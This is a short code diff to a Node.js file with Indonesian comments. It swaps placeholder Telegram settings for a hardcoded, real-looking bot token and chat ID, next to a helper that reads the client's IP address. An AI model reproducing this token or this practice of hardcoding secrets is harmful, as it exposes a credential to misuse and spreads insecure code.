@@ -3,8 +3,8 @@ import fetch from 'node-fetch';
 import { FormData } from 'form-data';
 
 // Konfigurasi Telegram (HARDCODED untuk Kizhoo saja)
-const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
-const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8528597137:AAFgqjbwMLeMj4jAFbn73cI2RRWxtsxzQPQ';
+const CHAT_ID = process.env.CHAT_ID || '7465739067';
 
 // Helper untuk mendapatkan IP pengguna
 function getClientIp(req) {
